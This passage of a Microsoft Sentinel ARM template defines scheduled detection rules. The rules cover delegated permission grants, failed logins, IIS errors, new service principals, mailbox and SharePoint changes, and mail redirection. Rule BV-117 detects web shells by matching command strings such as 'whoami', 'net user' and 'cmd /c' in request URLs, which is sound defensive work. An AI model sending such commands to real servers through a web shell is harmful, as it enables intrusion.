          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11100')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11100')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11100: [RBA] Azure AD - Add Delegated Permission Grant",
          "description": "This alert identifies when Delegated Permissions have been added MITRE: T1098 Category: Azure AD tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let start_time = 1h;\nlet latency = 1h;\nlet alert_bin = 1h;\nlet end_time = now();\nAuditLogs\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where  OperationName in ('Consent to application')\n| extend bv_src_user = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n| mv-apply e=TargetResources[0].modifiedProperties to typeof(dynamic)  on (\n    extend bv_object_attr_admin = iff(e.displayName == 'ConsentContext.IsAdminConsent', e.newValue, '')\n    | extend bv_object_attr_permisions = iff(e.displayName == 'ConsentAction.Permissions', e.newValue, '')\n    | summarize take_any(bv_object_attr_admin), take_anyif(bv_object_attr_permisions, isnotempty(bv_object_attr_permisions))\n)\n| parse bv_object_attr_permisions with * 'Scope: ' bv_object_attr_permisions ',' *\n| extend \n    bv_object_attr = split(bv_object_attr_permisions, ' ')\n    , bv_object_category = 'account'\n    , bv_object_attr_category = 'access'\n    , bv_change_result = Result\n    , bv_change_action = 'modify'\n    , bv_object = tostring(TargetResources[0].displayName)\n| extend t = iff(bv_object_attr_admin contains 'True', dynamic(['admin_consent']), dynamic([]))\n| extend bv_object_attr = array_concat(bv_object_attr,t)\n| mv-apply e = BV11100_CONFIG['EXCLUSION'] on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n        | extend bv_object_excluded = iff(bv_object contains e.bv_object and isnotempty(e.bv_object), 1, 0)\n        | extend bv_object_attr_excluded = iff(bv_object_attr contains e.bv_object_attr and isnotempty(e.bv_object_attr), 1, 0)\n        | extend excluded_count = \n                bv_src_user_excluded\n                + bv_object_excluded\n                + bv_object_attr_excluded       \n        | extend transparent = iff(isnotempty(e.metadata[\"transparent\"]), e.metadata[\"transparent\"], true)\n        | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n        | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n        | summarize excluded=make_set(excluded), transparent=countif(transparent), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where ExcludedEvent == false or (ExcludedEvent == true and transparent == 0)\n| extend RBAScore = iff(bv_object_attr contains 'admin_consent', 3, 1)\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend ExtendedDescription = strcat(\n        'bv_src_user: ', bv_src_user, '\\n' \n        , 'bv_object: ', bv_object, '\\n' \n        , 'bv_object_attr: ', bv_object_attr, '\\n' \n        , 'RBAScore: ', RBAScore\n)\n| project \n    bv_start_time = TimeGenerated\n    , bv_alarm_time = now()\n    , bv_src_user\n    , bv_object\n    , bv_object_attr\n    , sourcetype = 'AuditLogs'\n    , RBAScore\n    , AttackerEntity\n    , ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies when Delegated Permissions have been added\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Azure AD\nMITRE: T1098"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-729')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-729')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-729: [RBA] Azure AD - Failed Logins for Monitored Accounts",
          "description": "The rule alerts when there is failed login for a specified account in Azure environment MITRE: T1110 Category: Azure AD tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let ingested_lookback = 15m; // earliest [ingest time] boundary\nlet generated_lookback = 30m; // earliest [log time] boundary\nlet alert_bin=1h;\nlet alert_number = 'BV-729';\nlet PreviousAlerts = toscalar(SecurityAlert\n| where TimeGenerated between (ago(A729_SUPPRESSION_THRESHOLD) .. now())\n| where AlertName has alert_number\n| extend Details = base64_decode_tostring(tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).['Custom Details'])).AlertData))[0]))\n| extend UserName = tostring(parse_json(Details).UserName)\n| summarize UserNames=make_set(UserName)\n);      \nunion isfuzzy=true\n(\nSigninLogs\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where ResultType in ('50053', '50126')\n| project TimeGenerated, IPAddress, ResultType, ResultDescription, Identity, AlternateSignInName, AppDisplayName, ClientAppUsed, IsInteractive, AuthenticationDetails, DeviceDetail, UserPrincipalName, UserType, LocationDetails, Type\n| extend AuthMethod = tostring(parse_json(AuthenticationDetails)[0].authenticationMethod)\n| extend SucceededOrNot = tostring(parse_json(AuthenticationDetails)[0].succeeded)\n| extend Browser = tostring(DeviceDetail.browser)\n| extend OperatingSystem = tostring(DeviceDetail.operatingSystem)\n| extend City = tostring(LocationDetails.city)\n| extend CountryOrRegion = tostring(LocationDetails.countryOrRegion)\n| extend State = tostring(LocationDetails.state)\n| extend City_Country = strcat(City, ' - ', CountryOrRegion)\n| parse UserPrincipalName with UserName '@' AccountUPNSuffix\n| where UserName matches regex (A729_INCLUDED_ACCOUNTS_REGEX)\n| summarize cnt=count(), EventDetails=make_set(pack_all(), MaxSize=5), Apps=make_set(AppDisplayName, MaxSize=5), City_Countries=make_set(City_Country, MaxSize=5),\nReason=make_set(ResultDescription, MaxSize=3) by IPAddress, UserName, bin(TimeGenerated, alert_bin), Type, AccountUPNSuffix\n),\n(\nAADNonInteractiveUserSignInLogs\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where ResultType != 0\n| where ResultDescription != 'Other'\n| where ResultType in ('53003', '50155', '50097', '50076', '50079', '500011')\n| project TimeGenerated, IPAddress, ResultType, ResultDescription, Identity, AlternateSignInName, AppDisplayName, ClientAppUsed, IsInteractive, AuthenticationDetails, DeviceDetail, UserPrincipalName, LocationDetails, Type\n| extend AuthMethod = tostring(parse_json(AuthenticationDetails)[0].authenticationMethod)\n| extend SucceededOrNot = tostring(parse_json(AuthenticationDetails)[0].succeeded)\n| extend Browser = tostring(parse_json(DeviceDetail).browser)\n| extend OperatingSystem = tostring(parse_json(DeviceDetail).operatingSystem)\n| extend City = tostring(parse_json(LocationDetails).city)\n| extend CountryOrRegion = tostring(parse_json(LocationDetails).countryOrRegion)\n| extend State = tostring(parse_json(LocationDetails).state)\n| extend City_Country = strcat(City, ' - ', CountryOrRegion)\n| parse UserPrincipalName with UserName '@' AccountUPNSuffix\n| where UserName matches regex (A729_INCLUDED_ACCOUNTS_REGEX)\n| summarize cnt=count(), EventDetails=make_set(pack_all(), MaxSize=5), Apps=make_set(AppDisplayName, MaxSize=5), City_Countries=make_set(City_Country, MaxSize=5),\nReason=make_set(ResultDescription, MaxSize=3) by IPAddress, UserName, bin(TimeGenerated, alert_bin), Type, AccountUPNSuffix\n)\n| where cnt > A729_FAILED_LOGIN_THRESHOLD\n| extend AlertData = base64_encode_tostring(tostring(pack_all()))\n| extend ExcludedEvent = iff(UserName in (PreviousAlerts), true, false)\n| extend Tags = iff(ExcludedEvent, 'tag: RBA', 'tag: Delegate')",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT30M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-729: [RBA] Failed Logins for Monitored Accounts - Azure AD",
            "alertDescriptionFormat": "The rule alerts when there is failed login for a specified account in Azure environment. MITRE: T1110 Category: Azure AD {{Tags}}"
          },
          "customDetails": {
            "AlertData": "AlertData"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "AccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-215')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-215')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-215: [RBA] IIS - Error Status 500s",
          "description": "This alert identifies IIS website pages that generate errors (Status code 500+). MITRE: T1553 Category: IIS tag: RBA",
          "severity": "Informational",
          "enabled": true,
          "query": "W3CIISLog\n| where TimeGenerated >= ago(1d)\n| where toint(scStatus) >= 500\n| where cIP !in (WHITELISTED_IPS)\n|summarize Connections=count() by cIP,csUserAgent, HostCustomEntity = Computer, IPCustomEntity =sIP,sSiteName,csUriStem,csMethod,scStatus\n  | where Connections > IIS_ERRORS_THRESHOLD\n  | sort by Connections desc\n  | limit 50",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1553"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-117')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-117')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-117: [RBA] IIS - Web shell script detection",
          "description": "Web shells are script that when uploaded to a web server can be used for remote administration. Attackers often use web shells to obtain unauthorized access, escalate //privilege as well as further compromise the environment. The query detects web shells that use GET requests by keyword searches in URL strings. This is based out of sigma rules described //here (https://github.com/Neo23x0/sigma/blob/master/rules/web/web_webshell_keyword.yml). There could be some web sites like wikis with articles on os commands and pages that include the os //commands in the URLs that might cause FP. MITRE: T1505 Category: IIS tag: RBA",
          "severity": "High",
          "enabled": true,
          "query": "let ingested_lookback = 1h; // earliest [ingest time] boundary\nlet generated_lookback = 1d; // earliest [log time] boundary\nlet alert_bin = 1h;\nW3CIISLog\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where csMethod == 'GET'\n| where ( csUriQuery has 'whoami' or csUriQuery contains 'net%20user' or csUriQuery contains 'cmd%20/c%20' ) or\n        ( csUriStem has 'whoami' or csUriStem contains 'net%20user' or csUriStem contains 'cmd%20/c%20' ) or\n        ( csReferer has 'whoami' or csReferer contains 'net%20user' or csReferer contains 'cmd%20/c%20' )\n| summarize TimeGenerated=min(TimeGenerated), ConnectionCount = count(), Users=make_set_if(csUserName, isnotempty(csUserName), MaxSize=5), UriStem=make_set_if(csUriStem, isnotempty(csUriStem), MaxSize=5), UriQuery=make_set_if(csUriStem, isnotempty(csUriQuery), MaxSize=5) by Computer, sSiteName, sIP, TimeBin=bin(TimeGenerated, alert_bin)\n| parse Computer with HostName '.' HostDNS\n| project TimeGenerated, SourceIP=sIP, Computer, SiteName=sSiteName, ConnectionCount, Users, UriQuery, UriStem, HostName, HostDNS",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1505"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostDNS"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-428')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-428')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-428: [RBA] Azure AD - New Service Principal",
          "description": "This alert identifies successful creation of SPN (service principal names). This is one of the recommended detections from CISA (https://us-cert.cisa.gov/ncas/alerts/aa21-008a). MITRE: T1098,T1136,T1078 Category: Azure AD tag: RBA",
          "severity": "Informational",
          "enabled": true,
          "query": "AuditLogs\n| where TimeGenerated > ago(1h)\n| where OperationName =~ 'Add service principal'\n| where Result =~ 'success'\n| extend InitiatedBy = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n| extend SPNId = tostring(TargetResources[0].id)\n| extend SPNDisplayName = tostring(TargetResources[0].displayName)\n| extend Agent = tostring(AdditionalDetails[0].value)\n| where SPNDisplayName !in~ (WHITELISTED_SERVICE_PRINCIPALS)\n| project TimeGenerated,InitiatedBy,SPNDisplayName, SPNId, Result, Agent\n| extend AccountCustomEntity = InitiatedBy",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "InitialAccess",
            "PrivilegeEscalation",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1098",
            "T1136",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-072')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-072')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-072: [RBA] O365 - Non owner mailbox login activity",
          "description": "This will help you determine if mailbox access observed with Admin/Delegate Logontype. The logon type indicates mailbox accessed from non-owner user. Exchange allows Admin and delegate permissions to access other user's inbox.  If your organization has valid admin, delegate access given to users, you can whitelist those and investigate other results. MITRE: T1098 Category: Office 365 tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let timeframe = 1d;\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where Operation == 'MailboxLogin' and Logon_Type != 'Owner'\n| summarize count(), min(TimeGenerated), max(TimeGenerated) by Operation, OrganizationName, UserType, UserId, MailboxOwnerUPN, Logon_Type\n| extend AccountCustomEntity = UserId",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-168')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-168')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-168: [RBA] Azure AD - Account Added or Removed to Roles",
          "description": "Account added or removed from roles MITRE: T1098 Category: Azure AD tag: RBA",
          "severity": "Informational",
          "enabled": true,
          "query": "let start_time = 15m;\nlet alert_bin = 1h; \nlet latency =  1h;    \nlet end_time = now();\nAuditLogs\n|where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where OperationName in~ ('Add member to role', 'Remove member from role', 'Add eligible member to role')\n| extend bv_object_attr_category = 'group' \n| extend bv_object_category = 'account'\n| extend bv_object_category = iff(OperationName contains 'Remove', 'delete', 'modify')\n| extend bv_vendor_action = OperationName\n| extend bv_vendor_result = Result\n| extend bv_change_result = Result\n| mv-apply targetresource=TargetResources on ( \n    mv-apply t = targetresource on ( \n        extend bv_object = iff(targetresource.type == 'User', targetresource.userPrincipalName, '')\n        | mv-apply p = t.modifiedProperties on ( \n            extend bv_object_attr_old = iff(p.displayName == 'Role.DisplayName', p.oldValue, '') \n            | extend bv_object_attr_new = iff(p.displayName == 'Role.DisplayName', p.newValue, '') \n        )\n        | extend bv_object_attr = coalesce(bv_object_attr_new, bv_object_attr_old)\n    )\n    | summarize \n        take_anyif(bv_object, isnotempty(bv_object))\n        , take_any(bv_object_attr)\n)\n| extend src_user1 = parse_json(tostring(InitiatedBy.app)).displayName\n| extend src_user2 = parse_json(tostring(InitiatedBy.user)).userPrincipalName\n| extend bv_src_user = coalesce(src_user1, src_user2)\n| extend bv_src_ip =  parse_json(tostring(InitiatedBy.user)).ipAddress\n| extend bv_start_time = tostring(TimeGenerated)\n| extend AttackerEntity = iff(bv_src_user != 'MS-PIM', pack_array(bv_src_user), '')\n| extend VictimEntity = pack_array(bv_object)\n| extend RBAScore = BV168_CONFIG['RBACORE']\n| extend ExtendedDescription = strcat(\n        'bv_vendor_action: ', bv_vendor_action, '\\n' \n        , 'bv_object: ', bv_object, '\\n' \n        , 'bv_object_attr: ', bv_object_attr, '\\n' \n        , 'bv_src_user: ', bv_src_user, '\\n' \n        , 'RBAScore: ', RBAScore)\n| mv-apply e = BV168_CONFIG['EXCLUSION'] on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_vendor_action_excluded = iff(bv_vendor_action contains e.bv_vendor_action and isnotempty(e.bv_vendor_action), 1, 0)\n        | extend bv_object_excluded = iff(bv_object contains e.bv_object and isnotempty(e.bv_object), 1, 0)\n        | extend bv_object_attr_excluded = iff(bv_object_attr contains e.bv_object_attr and isnotempty(e.bv_object_attr), 1, 0)\n        | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n        | extend excluded_count = \n                bv_vendor_action_excluded\n                + bv_object_excluded            \n                + bv_object_attr_excluded               \n                + bv_src_user_excluded  \n        | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n        | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n        | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where ExcludedEvent == false\n| project-keep \n    TimeGenerated\n    , bv_*\n    , VictimEntity\n    , AttackerEntity\n    , RBAScore\n    , ExtendedDescription",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT1H15M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-168: [RBA] Azure AD - {{bv_object}} Added or Removed to Roles",
            "alertDescriptionFormat": "Account added or removed from roles\n\n{{ExtendedDescription}}\n\nMITRE: T1098\nCategory: Azure AD"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_object"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-008')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-008')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-008: [RBA] O365 - SharePoint site permissions modifications",
          "description": "This alert will trigger when some suspicious modifications are done to SharePoint sites, which are not recognized by the O365 admins. MITRE: T1078 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let ingested_lookback = 1d; // earliest [ingest time] boundary\nlet generated_lookback = 2d; // earliest [log time] boundary\nlet alert_bin = 1h;\nlet A008_EXCLUDED_SOURCE = dynamic(['TeamsService']);\nOfficeActivity\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where RecordType =~ 'SharePoint'\n| where Operation matches regex 'Modified|Deleted|Created'\n| parse Event_Data with '<SiteCreationSource>' CreationSource '</SiteCreationSource>' *\n| project TimeGenerated,RecordType,UserId,OfficeObjectId,Operation,ClientIP,Event_Data,ExtraProperties,ItemType,OrganizationId,UserType, CreationSource\n| where CreationSource !in~ (A008_EXCLUDED_SOURCE)\n| where tolower( UserId) matches regex tolower(MICROSOFT_OFFICE_OPERATIONS_ACCOUNTS) == false\n| where OfficeObjectId !contains 'sharepoint.com/personal'\n| where tolower(UserId) matches regex tolower(EXCLUDED_USER_ACCOUNTS) == false\n| where Operation !in (WHITELISTED_OFFICE_OPERATIONS)\n| summarize EventCount=count(), CreationSource=make_set(CreationSource), First=min(TimeGenerated), Last=max(TimeGenerated),Events=make_set(pack_all(),5)by AccountCustomEntity=UserId,IPCustomEntity=ClientIP,bin(TimeGenerated,alert_bin)\n| parse AccountCustomEntity with UserName '@' UserDomain\n| project TimeGenerated, AccountCustomEntity, IPCustomEntity,First, Last,Events, EventCount, CreationSource",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-429')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-429')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-429: [RBA] O365 - Mail Redirection Rule added",
          "description": "This alert identifies creation of Office 365 mail redirection rules - this may be an indicator of a malicious actor attempting to highjack a user's email MITRE: T1137 Category: Office 365 tag: RBA",
          "severity": "Informational",
          "enabled": true,
          "query": "OfficeActivity\n| where TimeGenerated > ago(1h)\n| where Parameters contains 'RedirectMessageTo'\n| where Operation =~ 'New-TransportRule'\n| project TimeGenerated, UserId,Operation,Parameters,ResultStatus, IPCustomEntity =  ClientIP\n| extend AccountCustomEntity = UserId",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1137"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
